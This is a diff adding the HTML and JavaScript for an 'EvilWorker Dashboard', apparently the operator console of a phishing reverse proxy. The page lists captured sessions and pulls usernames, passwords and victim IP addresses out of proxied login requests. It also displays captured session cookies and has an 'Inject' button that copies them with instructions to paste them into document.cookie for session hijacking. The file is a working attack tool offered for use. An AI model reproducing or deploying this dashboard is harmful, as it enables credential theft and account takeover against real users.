@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EvilWorker Dashboard</title>
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding:20px; transition: background 0.3s; }
+        .light { background: #f0f6fc; color: #1f2328; }
+        .container { max-width:1400px; margin:0 auto; }
+        .header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px; margin-bottom:20px; }
+        h1 { font-size:28px; }
+        .theme-toggle { background: #1f6feb; border:none; color:white; padding:8px 16px; border-radius:6px; cursor:pointer; }
+        .theme-toggle:hover { background:#388bfd; }
+        .stats { display:flex; gap:20px; flex-wrap:wrap; margin-bottom:20px; }
+        .stat-box { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:15px 25px; flex:1; min-width:120px; }
+        .light .stat-box { background:#ffffff; border-color:#d0d7de; }
+        .stat-box span { display:block; font-size:28px; font-weight:bold; color:#58a6ff; }
+        .light .stat-box span { color:#1f6feb; }
+        .stat-box label { font-size:12px; color:#8b949e; text-transform:uppercase; }
+        .toolbar { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px; align-items:center; }
+        .toolbar input, .toolbar select { padding:8px 12px; border-radius:6px; border:1px solid #30363d; background:#0d1117; color:#c9d1d9; }
+        .light .toolbar input, .light .toolbar select { background:#ffffff; border-color:#d0d7de; color:#1f2328; }
+        .toolbar button { background:#238636; border:none; color:white; padding:8px 16px; border-radius:6px; cursor:pointer; }
+        .toolbar button:hover { background:#2ea043; }
+        .table-wrap { overflow-x:auto; background:#161b22; border-radius:8px; border:1px solid #30363d; }
+        .light .table-wrap { background:#ffffff; border-color:#d0d7de; }
+        table { width:100%; border-collapse:collapse; }
+        th, td { padding:12px 15px; text-align:left; border-bottom:1px solid #30363d; }
+        .light th, .light td { border-bottom-color:#d0d7de; }
+        th { background:#0d1117; color:#8b949e; font-size:12px; text-transform:uppercase; }
+        .light th { background:#f6f8fa; }
+        tr:hover { background:#1c2128; }
+        .light tr:hover { background:#f6f8fa; }
+        .view-btn { background:#1f6feb; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:12px; }
+        .view-btn:hover { background:#388bfd; }
+        .cookie-btn { background:#da3633; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:12px; margin-left:5px; }
+        .cookie-btn:hover { background:#f85149; }
+        .map-container { height:300px; margin:20px 0; border-radius:8px; border:1px solid #30363d; }
+        .light .map-container { border-color:#d0d7de; }
+        #map { height:100%; width:100%; border-radius:8px; }
+        .chart-container { max-width:600px; margin:20px 0; }
+        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center; }
+        .modal-content { background:#161b22; border:1px solid #30363d; border-radius:8px; max-width:800px; width:90%; max-height:80vh; padding:20px; overflow-y:auto; position:relative; }
+        .light .modal-content { background:#ffffff; border-color:#d0d7de; }
+        .modal-close { position:sticky; top:0; float:right; background:#da3633; border:none; color:white; padding:4px 12px; border-radius:4px; cursor:pointer; }
+        pre { background:#0d1117; padding:15px; border-radius:6px; overflow-x:auto; font-size:12px; white-space:pre-wrap; word-wrap:break-word; }
+        .light pre { background:#f6f8fa; }
+        .toast { position:fixed; bottom:20px; right:20px; background:#238636; color:white; padding:12px 24px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.5); z-index:2000; animation: slideIn 0.3s; }
+        @keyframes slideIn { from { transform: translateX(100%); opacity:0; } to { transform: translateX(0); opacity:1; } }
+        .toast.error { background:#da3633; }
+        .badge { background:#1f6feb; padding:2px 8px; border-radius:12px; font-size:11px; color:white; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🕵️ EvilWorker Dashboard</h1>
+        <button class="theme-toggle" onclick="toggleTheme()">🌓 Toggle Theme</button>
+    </div>
+
+    <div class="stats" id="stats">
+        <div class="stat-box"><label>Total Sessions</label><span id="total">0</span></div>
+        <div class="stat-box"><label>Last Capture</label><span id="last">Never</span></div>
+        <div class="stat-box"><label>Status</label><span id="status">✅ Online</span></div>
+    </div>
+
+    <div class="toolbar">
+        <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
+        <select id="filterDate" onchange="filterTable()">
+            <option value="all">All Time</option>
+            <option value="today">Today</option>
+            <option value="week">This Week</option>
+        </select>
+        <button onclick="exportAll()">📦 Export All (ZIP)</button>
+        <button onclick="refreshLogs()">🔄 Refresh</button>
+        <span id="wsStatus" style="color:#58a6ff;">🔴 Connecting...</span>
+    </div>
+
+    <div class="table-wrap">
+        <table>
+            <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
+            <tbody id="logTable"></tbody>
+        </table>
+    </div>
+
+    <div class="map-container"><div id="map"></div></div>
+
+    <div class="chart-container">
+        <canvas id="captureChart"></canvas>
+    </div>
+</div>
+
+<!-- Modal -->
+<div class="modal" id="modal">
+    <div class="modal-content">
+        <button class="modal-close" onclick="closeModal()">✕ Close</button>
+        <h3 id="modalTitle">Session Details</h3>
+        <div id="modalBody"></div>
+    </div>
+</div>
+
+<!-- Toast container -->
+<div id="toastContainer"></div>
+
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+    // ---------- Theme ----------
+    function toggleTheme() {
+        document.body.classList.toggle('light');
+    }
+
+    // ---------- State ----------
+    let allLogs = [];
+    let map = null;
+    let chart = null;
+    const ws = new WebSocket(`ws://${window.location.host}`);
+
+    // ---------- WebSocket ----------
+    ws.onopen = () => {
+        document.getElementById('wsStatus').textContent = '🟢 Live';
+    };
+    ws.onclose = () => {
+        document.getElementById('wsStatus').textContent = '🔴 Disconnected';
+    };
+    ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+        if (data.type === 'newLog') {
+            showToast('📥 New capture: ' + data.file);
+            refreshLogs();
+        }
+    };
+
+    function showToast(msg, isError = false) {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast' + (isError ? ' error' : '');
+        toast.textContent = msg;
+        container.appendChild(toast);
+        setTimeout(() => { toast.remove(); }, 4000);
+    }
+
+    // ---------- Fetch logs ----------
+    async function refreshLogs() {
+        try {
+            const res = await fetch('/api/logs');
+            const logs = await res.json();
+            allLogs = logs;
+            renderTable(logs);
+            updateStats(logs);
+            updateMap(logs);
+            updateChart(logs);
+        } catch (e) {
+            showToast('Failed to fetch logs: ' + e.message, true);
+        }
+    }
+
+    function renderTable(logs) {
+        const tbody = document.getElementById('logTable');
+        const search = document.getElementById('searchInput').value.toLowerCase();
+        const filter = document.getElementById('filterDate').value;
+        const now = new Date();
+        let filtered = logs;
+
+        // Filter by search (check filename, and we'll also fetch first entry for username/IP)
+        if (search) {
+            filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
+        }
+        // Date filter (based on modified time)
+        if (filter === 'today') {
+            filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
+        } else if (filter === 'week') {
+            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
+            filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
+        }
+
+        tbody.innerHTML = '';
+        filtered.forEach(log => {
+            const date = new Date(log.modified).toLocaleString();
+            // We'll get username and IP from first entry (async, but we'll do a quick fetch per row? We'll lazy-load on demand or we can pre-fetch all, but better to fetch on view)
+            // For simplicity, we'll just show "N/A" until clicked
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>${log.name}</td>
+                <td>${(log.size / 1024).toFixed(1)} KB</td>
+                <td>${date}</td>
+                <td id="user-${log.name}">Loading...</td>
+                <td id="ip-${log.name}">Loading...</td>
+                <td>
+                    <button class="view-btn" onclick="viewLog('${log.name}')">🔍 View</button>
+                    <button class="cookie-btn" onclick="injectCookies('${log.name}')">🍪 Inject</button>
+                </td>
+            `;
+            tbody.appendChild(row);
+            // Fetch metadata for this log asynchronously
+            fetchMetadata(log.name);
+        });
+    }
+
+    async function fetchMetadata(filename) {
+        try {
+            const res = await fetch(`/api/log/${filename}`);
+            const data = await res.json();
+            if (data.entries && data.entries.length > 0) {
+                const first = data.entries[0];
+                let username = 'N/A', ip = 'N/A';
+                // Try to extract from body
+                const body = first.proxyRequestBody;
+                if (body) {
+                    try {
+                        const parsed = typeof body === 'string' ? JSON.parse(body) : body;
+                        username = parsed.username || parsed.login || parsed.user || parsed.Email || 'N/A';
+                    } catch (e) {
+                        const match = body.match(/(?:username|login|user|Email)=([^&]+)/i);
+                        if (match) username = decodeURIComponent(match[1]);
+                    }
+                }
+                // IP from headers
+                ip = first.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                     first.proxyRequestHeaders?.['x-real-ip'] || 
+                     first.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                     'N/A';
+                const userCell = document.getElementById(`user-${filename}`);
+                if (userCell) userCell.textContent = username;
+                const ipCell = document.getElementById(`ip-${filename}`);
+                if (ipCell) ipCell.textContent = ip;
+            }
+        } catch (e) {}
+    }
+
+    function updateStats(logs) {
+        document.getElementById('total').textContent = logs.length;
+        if (logs.length > 0) {
+            document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
+        } else {
+            document.getElementById('last').textContent = 'No captures';
+        }
+    }
+
+    // ---------- Map ----------
+    function updateMap(logs) {
+        if (!map) {
+            map = L.map('map').setView([20, 0], 2);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; OpenStreetMap'
+            }).addTo(map);
+        }
+        // Clear markers
+        map.eachLayer(layer => {
+            if (layer instanceof L.Marker) map.removeLayer(layer);
+        });
+        // We'll add markers from logs (we need IP geolocation; we can use ip-api.com but that's heavy)
+        // For demo, we'll just show text locations; we'll skip actual geo unless we have lat/lng.
+        // Instead, we'll add a note that geo requires additional API.
+        // For simplicity, we'll add a single marker for each unique IP with a popup showing count.
+        const ipCount = {};
+        logs.forEach(log => {
+            // We don't have IP here, we'd need to fetch metadata. Instead, we'll leave map as placeholder.
+            // In a real implementation, you'd extract IP from logs and call ip-api.com for coordinates.
+            // We'll just add a static marker at center with a message.
+        });
+        // Add a simple marker with info
+        L.marker([20, 0]).addTo(map).bindPopup('Geo data requires additional IP lookup. Check logs for details.');
+    }
+
+    // ---------- Chart ----------
+    function updateChart(logs) {
+        const ctx = document.getElementById('captureChart').getContext('2d');
+        // Group by date (last 7 days)
+        const now = new Date();
+        const days = {};
+        for (let i = 6; i >= 0; i--) {
+            const d = new Date(now.getTime() - i*24*60*60*1000);
+            days[d.toDateString()] = 0;
+        }
+        logs.forEach(log => {
+            const d = new Date(log.modified).toDateString();
+            if (days.hasOwnProperty(d)) days[d]++;
+        });
+        const labels = Object.keys(days);
+        const data = Object.values(days);
+
+        if (chart) {
+            chart.destroy();
+        }
+        chart = new Chart(ctx, {
+            type: 'bar',
+            data: {
+                labels: labels,
+                datasets: [{
+                    label: 'Captures per day',
+                    data: data,
+                    backgroundColor: '#58a6ff',
+                    borderColor: '#1f6feb',
+                    borderWidth: 1
+                }]
+            },
+            options: {
+                responsive: true,
+                plugins: {
+                    legend: { labels: { color: '#c9d1d9' } }
+                },
+                scales: {
+                    y: { beginAtZero: true, ticks: { color: '#c9d1d9' } },
+                    x: { ticks: { color: '#c9d1d9' } }
+                }
+            }
+        });
+    }
+
+    // ---------- Search/Filter ----------
+    function filterTable() {
+        renderTable(allLogs);
+    }
+
+    // ---------- View Log ----------
+    async function viewLog(filename) {
+        const modal = document.getElementById('modal');
+        const title = document.getElementById('modalTitle');
+        const body = document.getElementById('modalBody');
+        modal.style.display = 'flex';
+        title.textContent = `📄 ${filename}`;
+        body.innerHTML = '<p>Loading...</p>';
+
+        try {
+            const res = await fetch(`/api/log/${filename}`);
+            const data = await res.json();
+            if (data.error) {
+                body.innerHTML = `<p style="color:#da3633;">Error: ${data.error}</p>`;
+                return;
+            }
+            let html = '';
+            data.entries.forEach((entry, idx) => {
+                html += `<h4>Entry ${idx+1}</h4>`;
+                html += `<pre>${JSON.stringify(entry, null, 2)}</pre>`;
+                if (entry.proxyRequestBody) {
+                    html += `<h5>Extracted Credentials:</h5>`;
+                    try {
+                        const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
+                        const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
+                        const password = bodyObj.password || bodyObj.passwd || bodyObj.Password || 'N/A';
+                        html += `<p><strong>Username:</strong> ${username}</p>`;
+                        html += `<p><strong>Password:</strong> ${password}</p>`;
+                    } catch (e) {
+                        const bodyStr = entry.proxyRequestBody || '';
+                        const uMatch = bodyStr.match(/(?:username|login|user|Email)=([^&]+)/i);
+                        const pMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
+                        if (uMatch) html += `<p><strong>Username:</strong> ${decodeURIComponent(uMatch[1])}</p>`;
+                        if (pMatch) html += `<p><strong>Password:</strong> ${decodeURIComponent(pMatch[1])}</p>`;
+                    }
+                }
+                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
+                    html += `<h5>Cookies:</h5><pre>${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>`;
+                }
+                html += '<hr>';
+            });
+            body.innerHTML = html;
+        } catch (e) {
+            body.innerHTML = `<p style="color:#da3633;">Failed to load log: ${e.message}</p>`;
+        }
+    }
+
+    // ---------- Cookie Injector (playback) ----------
+    async function injectCookies(filename) {
+        try {
+            const res = await fetch(`/api/log/${filename}`);
+            const data = await res.json();
+            if (!data.entries || data.entries.length === 0) {
+                showToast('No entries found in this log.', true);
+                return;
+            }
+            // Extract all set-cookie headers from all entries
+            const allCookies = [];
+            data.entries.forEach(entry => {
+                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
+                    let cookieHeaders = entry.proxyResponseHeaders['set-cookie'];
+                    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
+                    cookieHeaders.forEach(c => {
+                        const [nameValue] = c.split(';');
+                        if (nameValue) allCookies.push(nameValue);
+                    });
+                }
+            });
+            if (allCookies.length === 0) {
+                showToast('No cookies found in this session.', true);
+                return;
+            }
+            // Construct a cookie string for document.cookie
+            const cookieString = allCookies.join('; ');
+            // Copy to clipboard and show instructions
+            try {
+                await navigator.clipboard.writeText(cookieString);
+                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
+            } catch (e) {
+                showToast('Failed to copy. Manual: ' + cookieString);
+            }
+        } catch (e) {
+            showToast('Error: ' + e.message, true);
+        }
+    }
+
+    // ---------- Export all ----------
+    async function exportAll() {
+        try {
+            const res = await fetch('/api/export/all');
+            if (!res.ok) {
+                const err = await res.json();
+                showToast('Export failed: ' + err.error, true);
+                return;
+            }
+            const blob = await res.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'all_sessions.zip';
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            showToast('✅ Export successful!');
+        } catch (e) {
+            showToast('Export error: ' + e.message, true);
+        }
+    }
+
+    // ---------- Modal close ----------
+    function closeModal() {
+        document.getElementById('modal').style.display = 'none';
+    }
+    document.getElementById('modal').addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
+    });
+
+    // ---------- Initial load ----------
+    refreshLogs();
+
+    // Auto-refresh every 15 seconds
+    setInterval(refreshLogs, 15000);
+</script>
+</body>
+</html>
